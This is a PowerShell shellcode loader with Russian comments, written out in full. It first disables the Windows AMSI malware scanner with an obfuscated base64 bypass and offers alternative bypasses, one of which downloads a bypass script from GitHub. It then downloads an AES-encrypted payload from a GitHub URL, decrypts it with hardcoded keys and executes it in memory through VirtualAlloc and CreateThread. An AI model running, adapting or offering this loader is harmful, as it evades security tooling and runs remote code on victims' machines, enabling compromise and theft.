# ============================================================
#  AMSI BYPASS (выберите один из вариантов, остальные закомментируйте)
# ============================================================


[Reflection.Assembly]::Load([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAXQAkAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAA9ACQAdAByAHUAZQA=")))) | Out-Null

# --- ВАРИАНТ 2: Скачать готовый скрипт байпаса с GitHub (надёжнее) ---
# IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chainski/GlobalAMSIBypass/main/amsi.ps1')

# --- ВАРИАНТ 3: Простейший (может не сработать на новых версиях) ---
# [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true

# ============================================================
#  КОНФИГУРАЦИЯ
# ============================================================

# !!! ЗАМЕНИТЕ ЭТИ ТРИ СТРОКИ !!!
$url = "https://raw.githubusercontent.com/fp228hash/12312s1/refs/heads/main/loader.ps1"
$keyB64 = "fVTehay+BdWjG36Y/uVTsSRxcigFTDnLYNmBn3UTlG0="     # из вывода aes_encrypt.py
$ivB64  = "YDmQpIzrqjLut2FFkpCmrA=="       # из вывода aes_encrypt.py

# ============================================================
#  СКАЧИВАНИЕ ЗАШИФРОВАННОГО PAYLOAD
# ============================================================

$wc = New-Object System.Net.WebClient
$encrypted = $wc.DownloadData($url)

# ============================================================
#  ПРЕОБРАЗОВАНИЕ КЛЮЧА И IV ИЗ BASE64
# ============================================================

$key = [System.Convert]::FromBase64String($keyB64)
$iv  = [System.Convert]::FromBase64String($ivB64)

# ============================================================
#  РАСШИФРОВКА AES-256-CBC
# ============================================================

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$aes.Dispose()

# ============================================================
#  ПОДКЛЮЧЕНИЕ WINAPI ФУНКЦИЙ
# ============================================================

$VirtualAlloc = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@ -Name "WinAPI" -Namespace "Kernel32" -PassThru

$RtlMoveMemory = Add-Type -MemberDefinition @"
[DllImport("ntdll.dll")]
public static extern void RtlMoveMemory(IntPtr dest, byte[] src, uint length);
"@ -Name "NtAPI" -Namespace "Ntdll" -PassThru

$CreateThread = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -Name "ThreadAPI" -Namespace "Kernel32" -PassThru

$WaitForSingleObject = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name "WaitAPI" -Namespace "Kernel32" -PassThru

# ============================================================
#  ЗАПУСК SHELLCODE В ПАМЯТИ
# ============================================================

$mem = $VirtualAlloc::VirtualAlloc([IntPtr]::Zero, $decrypted.Length, 0x3000, 0x40)
$RtlMoveMemory::RtlMoveMemory($mem, $decrypted, $decrypted.Length)
$thread = $CreateThread::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject::WaitForSingleObject($thread, 0xFFFFFFFF)